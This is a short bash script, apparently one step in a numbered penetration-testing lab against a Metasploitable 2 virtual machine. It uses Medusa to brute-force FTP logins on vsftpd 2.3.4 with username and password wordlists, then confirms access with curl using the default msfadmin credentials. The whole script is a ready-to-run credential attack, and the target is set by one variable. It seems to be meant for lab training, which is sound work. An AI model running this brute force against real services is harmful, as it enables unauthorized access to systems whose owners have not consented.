#!/usr/bin/env bash
# 02 — Força bruta em FTP com Medusa.
# Serviço: vsftpd 2.3.4 (Metasploitable 2)
set -uo pipefail
TARGET="${TARGET:-192.168.56.102}"
BASE="$(cd "$(dirname "$0")/.." && pwd)"
cd "$BASE"
mkdir -p logs

echo "== Medusa :: FTP =="
medusa -h "$TARGET" \
  -U wordlists/users.txt \
  -P wordlists/passwords.txt \
  -M ftp -t 1 -f \
  -O logs/02-ftp-medusa.log \
  2>&1 | tee logs/02-ftp-console.txt

echo
echo "== Validação do acesso encontrado =="
curl -s --max-time 10 "ftp://msfadmin:msfadmin@$TARGET/" \
  | head -20 | tee logs/02-ftp-validacao.txt
